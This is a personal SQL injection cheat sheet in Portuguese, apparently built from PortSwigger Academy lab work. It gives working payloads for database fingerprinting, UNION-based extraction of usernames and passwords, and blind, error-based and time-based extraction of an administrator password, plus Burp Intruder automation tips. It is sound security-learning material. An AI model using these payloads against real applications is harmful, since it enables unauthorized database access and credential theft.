# SQL Injection - Cheat Sheet Pessoal

Referência rápida consolidada a partir dos labs do PortSwigger Web Security Academy.
Organizado por técnica, com dicas de SQL puro, de injection e erros comuns já caçados.

---

## 1. SQL puro - conceitos base

| Conceito | O que faz |
|---|---|
| `'` (aspas simples) | Delimita string literal. Injetar uma sozinha quebra a sintaxe se o input não for sanitizado — teste de fumaça clássico. |
| `OR` | Verdadeiro se qualquer um dos lados for verdadeiro. `OR 1=1` derruba filtros de WHERE. |
| `AND` | Verdadeiro só se AMBOS os lados forem verdadeiros. Essencial em blind SQLi: o lado esquerdo (TrackingId real, ou algo que sempre é verdadeiro) precisa ser true, senão a condição toda vira false e mascara o teste. |
| `UNION` | Empilha resultados de duas queries. Exige mesmo número de colunas e tipos compatíveis entre elas. Não é JOIN — não relaciona tabelas, só concatena linhas. |
| `SUBSTRING(texto, pos_inicial, qtd)` | Corta um pedaço de uma string. Ex: `SUBSTRING(password,1,1)` = primeiro caractere. Chama-se `SUBSTR` no Oracle. |
| `CASE WHEN cond THEN x ELSE y END` | If/else dentro do SQL. Retorna `x` se `cond` for true, `y` se for false. |
| `CAST(valor AS tipo)` | Converte tipo de dado. Se o valor não for compatível (ex: texto não-numérico para `int`), gera erro — e em bancos verbosos, o erro pode incluir o próprio valor. |
| `information_schema.tables` / `.columns` | "Banco de dados sobre o banco de dados" — lista tabelas e colunas existentes sem precisar adivinhar nomes. Não existe no Oracle. |
| `||` (PostgreSQL/Oracle) | Concatenação de strings. Usado para juntar múltiplos valores numa única coluna de texto (ex: `username || '~' || password`). |
| `NULL` | Representa ausência de valor. Qualquer concatenação ou operação com `NULL` propaga `NULL` para o resultado inteiro (`'admin' || NULL = NULL`). Aceito por qualquer tipo de coluna — por isso é o "coringa neutro" em testes de UNION. |

---

## 2. Fingerprinting de DBMS

### Em contexto visível (UNION funciona, dá pra ver o resultado)
```sql
' UNION SELECT @@version, NULL--        -- MySQL / SQL Server
' UNION SELECT version(), NULL--        -- PostgreSQL
' UNION SELECT banner, NULL FROM v$version-- -- Oracle (ou usar v$version com ROWNUM=1)
```

### Em contexto blind (sem ver resultado — usar erro/sucesso como sinal)
Testar cada sintaxe e observar se dá erro (sintaxe não reconhecida) ou responde normal:
```sql
' AND @@version IS NOT NULL--                              -- MySQL / SQL Server
' AND version() IS NOT NULL--                               -- PostgreSQL
' AND (SELECT version FROM v$version WHERE ROWNUM=1) IS NOT NULL-- -- Oracle
```
**Sempre ter um teste de controle antes** (`' AND 1=1--`) para confirmar que a injeção básica funciona, e assim distinguir "erro por sintaxe não reconhecida" de "erro por outro motivo qualquer".

---

## 3. UNION attacks

### Passo 1: descobrir número de colunas
```sql
' ORDER BY 1-- ' ORDER BY 2-- ' ORDER BY 3--   -- incrementa até dar erro (sondagem por erro)
' UNION SELECT NULL-- ' UNION SELECT NULL,NULL--  -- incrementa até funcionar (execução real, prova de UNION)
```
> O critério de "resolvido" em alguns labs exige especificamente o método do `UNION SELECT NULL` — o `ORDER BY` só prova via erro, nunca executa um UNION de fato.

### Passo 2: descobrir qual coluna aceita string
```sql
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--
```
Sempre `NULL` nas colunas que não estão sendo testadas — isola a variável, evita erro de tipo vindo de outra posição.

### Passo 3: extrair dados
```sql
' UNION SELECT username, password FROM users--
```
Se só existe 1 coluna de texto disponível, concatenar:
```sql
' UNION SELECT NULL, username || '~' || password FROM users--
```
**Cuidado com NULL:** se um dos campos concatenados for NULL no banco, a linha inteira desaparece. Testar colunas isoladamente se uma linha específica "sumir".

### Descobrindo tabelas/colunas via information_schema (quando o nome não é dado)
```sql
' UNION SELECT NULL, table_schema || '~' || table_name FROM information_schema.tables WHERE table_schema='public'--
' UNION SELECT NULL, column_name || '~' || data_type FROM information_schema.columns WHERE table_name='nome_da_tabela'--
```
Filtrar por `table_schema = 'public'` evita ter que vasculhar manualmente centenas de tabelas de sistema (`pg_catalog`, `information_schema`).

---

## 4. Blind SQLi - Conditional responses

Quando a aplicação muda de conteúdo (ex: "Welcome back") dependendo do resultado da query.

```sql
tracking_id_real' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1) > 'm'--
```

**Estratégia: busca binária manual.** Comparar com `>`/`<` para dividir o alfabeto/tabela ASCII ao meio a cada tentativa, convergindo pro caractere exato — muito mais rápido que testar letra por letra.

Descobrir o tamanho da senha: testar posições crescentes até uma vir "vazia" (string vazia é lexicograficamente menor que qualquer caractere real).

---

## 5. Blind SQLi - Conditional errors

Quando a aplicação não muda de conteúdo, mas dá erro (ou resposta diferente) se a query falhar.

```sql
tracking_id_real' AND (SELECT CASE WHEN (condição) THEN 1/0 ELSE 'a' END FROM users WHERE username='administrator')='a'--
```

- O filtro (`WHERE username = '...'`) deve ficar **fora** do CASE, não dentro do WHEN — senão o CASE roda para cada linha da tabela e a subquery tenta devolver múltiplos valores.
- `1/0` é o gatilho de erro universal (divisão por zero é impossível em qualquer banco).
- **Pegadinha do Oracle:** se um ramo do CASE retorna número (`1/0`) e o outro retorna texto (`'a'`), o Oracle tenta forçar os dois ao mesmo tipo, e a conversão de `'a'` para número falha — dando erro SEMPRE, mascarando o teste real. Solução: `TO_CHAR(1/0)` para igualar os tipos entre os ramos.
- Case sensitivity importa nos **valores** comparados (`'administrator'` ≠ `'Administrator'`), mesmo quando não importa nos nomes de tabela/coluna.

---

## 6. Error-based SQLi (visível / verbose errors)

Quando o erro do banco contém o próprio dado, transformando um cenário blind em visível.

```sql
x' AND CAST((SELECT password FROM users WHERE username='administrator') AS int)=1--
```
PostgreSQL tem sintaxe curta: `(...)::int` no lugar de `CAST(... AS int)`.

- O `=1` no final é só para satisfazer a sintaxe do `AND` (que exige booleano) — nunca é de fato alcançado, porque o CAST já quebra antes.
- **Atenção a limites de tamanho do campo injetado** (cookies costumam ter limite, ex: ~60 caracteres). Sintoma: erro sempre de "unterminated string", cortando sempre na mesma posição, independente do conteúdo. Testar com string de caracteres fáceis de contar para encontrar o limite exato.
- Formas de economizar caracteres quando o limite aperta:
  - Trocar o valor real do cookie/campo por um único caractere (ex: `x`).
  - Trocar `WHERE username = 'administrator'` por `LIMIT 1` (mais curto, mas não garante qual linha vem primeiro sem `ORDER BY` — validar testando o campo `username` antes de confiar no resultado).
  - Usar `MAX()`/`MIN()` para forçar um único valor sem WHERE (mas também não garante que seja o usuário certo).

---

## 7. Blind SQLi - Time-based (Sleep)

Quando a aplicação não muda nem conteúdo nem comportamento de erro — único sinal possível é o tempo de resposta.

```sql
' AND (SELECT CASE WHEN (condição) THEN SLEEP(10) ELSE 'a' END FROM users WHERE username='administrator')='a'--
```
Funções de delay por banco (conferir cheat sheet oficial do PortSwigger para variações):
- MySQL: `SLEEP(10)`
- PostgreSQL: `pg_sleep(10)`
- SQL Server: `WAITFOR DELAY '0:0:10'`
- Oracle: `dbms_lock.sleep(10)` (geralmente requer permissões, ou usar uma subquery pesada como alternativa)

Mais lenta de operar manualmente — praticamente sempre vale automatizar com Intruder.

---

## 8. Peculiaridades de sintaxe por banco de dados

| Situação | Oracle | MySQL | PostgreSQL |
|---|---|---|---|
| SELECT sem tabela | Precisa de `FROM DUAL` | Funciona sem FROM | Funciona sem FROM |
| Comentário `--` | Funciona | Precisa de espaço depois (`-- `) | Funciona |
| Comentário alternativo | — | `#` | — |
| SUBSTRING | `SUBSTR` | `SUBSTRING` ou `SUBSTR` | `SUBSTRING` ou `SUBSTR` |
| Concatenação | `||` | `CONCAT()` | `||` |
| Versão do banco | `SELECT * FROM v$version` | `SELECT @@version` | `SELECT version()` |
| information_schema | Não existe (usar `all_tables`, `user_tables`) | Existe | Existe |

---

## 9. Automação com Burp Intruder

- **Sniper:** uma posição variável, testa lista de valores um a um. Bom para testar todos os candidatos de UMA posição (`=` em vez de busca binária, já que o custo por tentativa é automatizado).
- **Payload type "Brute forcer":** define um character set (ex: `0123456789abcdefghijklmnopqrstuvwxyz`) e gera todas as combinações de um tamanho definido — evita ter que colar lista manual.
- **Cluster bomb:** múltiplas posições variáveis simultâneas (ex: posição do caractere + candidato) — testa todas as combinações, útil para automatizar a senha inteira de uma vez.
- Analisar resultado ordenando pela coluna de **Status code** (erro vs sucesso) ou **Length** (tamanho da resposta) para achar rapidamente qual candidato deu diferente dos demais.
- Community Edition tem throttling (mais lento que Professional), mas é plenamente utilizável para os labs.

---

## 10. Erros comuns / checklist de depuração

Quando algo "sempre dá erro" ou "nunca dá erro" (não muda com a condição testada) — sinal de bug estrutural, não resultado genuíno. Isolar simplificando ao extremo:
1. Testar só a injeção básica (`' AND 1=1--`) — confirma que a injeção em si funciona.
2. Testar a subquery sozinha, sem CASE/CAST — confirma nomes de tabela/coluna corretos.
3. Adicionar CASE sem o gatilho de erro (ex: `THEN 'b' ELSE 'a'`) — confirma que a estrutura condicional está OK.
4. Só então adicionar o gatilho de erro real (`1/0`, `CAST`, etc).

Bugs específicos já caçados nessa jornada:
- Filtro (`WHERE`) dentro do `CASE WHEN` em vez de fora, na subquery.
- Case sensitivity em valores comparados (`'Administrator'` vs `'administrator'`).
- Aspas não fechadas antes do `--`.
- Tipos incompatíveis entre ramos do `CASE` (Oracle é rígido com isso).
- Duplicação de texto ao editar payload no Burp (copiar/colar sem substituir o anterior).
- Aspas "tipográficas" (curvas) inseridas por autocorreção ao copiar de apps de texto — usar aspas retas sempre.
- Truncamento por limite de tamanho de campo — sintoma: erro sempre no mesmo ponto da query, independente do conteúdo.
